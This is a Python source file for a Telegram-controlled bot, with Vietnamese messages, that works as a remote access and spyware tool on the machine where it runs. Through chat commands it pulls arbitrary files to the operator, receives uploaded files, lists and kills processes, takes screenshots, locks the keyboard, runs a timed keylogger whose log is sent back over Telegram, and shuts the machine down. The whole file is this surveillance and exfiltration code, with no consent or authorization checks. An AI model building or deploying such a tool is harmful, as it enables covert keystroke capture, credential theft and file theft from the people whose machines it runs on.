import telebot
import json
import sys
import os
import time
import threading
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), 'src/modules')))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), 'src/config')))

from src.modules.banner import gif_welcome,menu
from pathlib import Path

from src.modules.eget_0103 import clean_filename,get_user_processes,kill_pid
from src.modules.screenshot import screen_shot
from src.modules.kboard import block_keyboard
from src.modules.key_logger import key_logger
from src.modules.shutdown import shutdown
def loadCg():
    with open("src/config/config.json","r",encoding="utf-8") as f:
        cfg = json.load(f)
        return cfg
data = loadCg()
delay_polling = data["main"]["delay_polling"]
data_folder = data["main"]["data_folder"]
tokenBot = data["main"]["tokenBot"]
bot  = telebot.TeleBot(tokenBot)
sendf = False
running_ = {
    "keylock":0,
    "keylogger":0
    }
def lauch():
    global bot,gif_welcome,menu,tokenBot
    #---------------------------------
    @bot.message_handler(["start"])
    def hi(mess):
        bot.send_animation(mess.chat.id,gif_welcome,caption=menu)
    #--------------------------
    @bot.message_handler(commands=["receivef"])
    def receivef(mess):
        content = mess.text
        content = content.split(" ")
        if len(content) == 2:
            file_path = Path(content[1])
            if file_path.exists():
                with open(file_path,"rb") as file:
                    bot.send_document(mess.chat.id,file,caption="Success")
            else :
                bot.reply_to(mess,"Đường dẫn không hợp lệ")
        else :
            bot.reply_to(mess,"Vui lòng nhập đường dẫn file")
    #------------------------------
    @bot.message_handler(commands=["sendf"])
    def sendf_(mess):
        global sendf
        bot.reply_to(mess,"Đã bật chế độ nhận file\nVui lòng gửi file")
        sendf = True
    #-----------------------------------------
    @bot.message_handler(content_types=["document"])
    def handle_file(message):
        global sendf
        if not sendf:
            bot.reply_to(message,"Vui lòng dùng lệnh /sendf trước!")
            return
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)  # Lấy thông tin file
        file_url = f"https://api.telegram.org/file/bot{tokenBot}/{file_info.file_path}"
        # Tải file về
        downloaded_file = bot.download_file(file_info.file_path)
        namefile = "/".join([data_folder,clean_filename(message.document.file_name)])
        with open(f"{namefile}", "wb") as file:
            file.write(downloaded_file)
        bot.reply_to(message, "File đã được tải về!")
    #------------------------------------------
    @bot.message_handler(commands=["running"])
    def running(mess):
        process = ""
        processes = get_user_processes()
        for proc in processes:
            process += f"PID: {proc['pid']} - Name: {proc['name']}\n"
        bot.reply_to(mess,process)
    #---------------------------------
    @bot.message_handler(commands=["kill"])
    def killtask(mess):
        cmd = mess.text
        cmd = cmd.split(" ")
        if len(cmd) == 2 and cmd[1].isdigit():
            pid = int(cmd[1])
            if kill_pid(pid):
                bot.reply_to(mess,f"PID {pid} - Đã dừng tiến trình thành công")
            else :
                bot.reply_to(mess,f"PID {pid} -  Dừng tiến trình thất bại")
        else :
            bot.reply_to(mess,"Lỗi cú pháp : thiếu pid hoặc pid không hợp lệ")
    #------------------------
    @bot.message_handler(commands=["screenshot"])
    def screenshot(mess):
        filepath = screen_shot(data_folder)
        with open(filepath,"rb") as file:
            bot.send_photo(mess.chat.id,file,caption="Success")
    #-------------------------------
    @bot.message_handler(commands=["keylock"])
    def keylock(mess):
        cmd = mess.text.split(" ")

        if len(cmd) == 2 and cmd[1].isdigit():
            timer = int(cmd[1])  # Chuyển thành số nguyên

            if running_.get("keylock", 0) == 0 or time.time() - running_["keylock"] >= timer:
                bot.reply_to(mess, f"Khóa bàn phím trong {timer} giây...")
                running_["keylock"] = time.time()
                block_keyboard(timer)  # Hàm khóa bàn phím
                
                # Tạo một thread để gửi thông báo khi xong
                threading.Timer(timer, notify_unlock, args=[mess]).start()
            else:
                bot.reply_to(mess, "Lệnh đang chạy rồi!")
        else:
            bot.reply_to(mess, "Thời gian phải là một số!")

    def notify_unlock(mess):
        bot.reply_to(mess, "Đã mở khóa bàn phím!")
    #-------------------------------
    @bot.message_handler(commands=["keylogger"])
    def keylogger(mess):
        cmd = mess.text.split(" ")

        if len(cmd) == 2 and cmd[1].isdigit():
            timer = int(cmd[1])  # Chuyển thành số nguyên

            if running_.get("keylogger", 0) == 0 or time.time() - running_["keylogger"] >= timer:
                bot.reply_to(mess, f"Giám sát bàn phím trong {timer} giây...")
                running_["keylogger"] = time.time()
                threading.Thread(target=run_keylogger, args=(mess, timer), daemon=True).start()
                # filename = keylogger(timer)
                # with open(filename,"rb") as file:
                #     bot.send_document(mess.chat.id,file,caption="Success")
            else:
                bot.reply_to(mess, "Lệnh đang chạy rồi!")
                return
        else:
            bot.reply_to(mess, "Thời gian phải là một số!")
            return
    def run_keylogger(mess, timer):
        filename = key_logger(timer, data_folder)  # Chạy keylogger

        # Chờ file tồn tại
        while not os.path.exists(filename):
            time.sleep(1)
        # Gửi file log
        with open(filename, "rb") as file:
            bot.send_document(mess.chat.id, file, caption="Ghi log thành công!")        
    #------------------------------
    @bot.message_handler(commands=["shutdown"])
    def shutdown(mess):
        bot.reply_to(mess,"Máy sẽ tắt sau 5 giây")
        shutdown()
        
            
        
def main():
    global bot
    lauch()
    bot.polling(timeout=int(delay_polling))    
if __name__ == "__main__":
    main()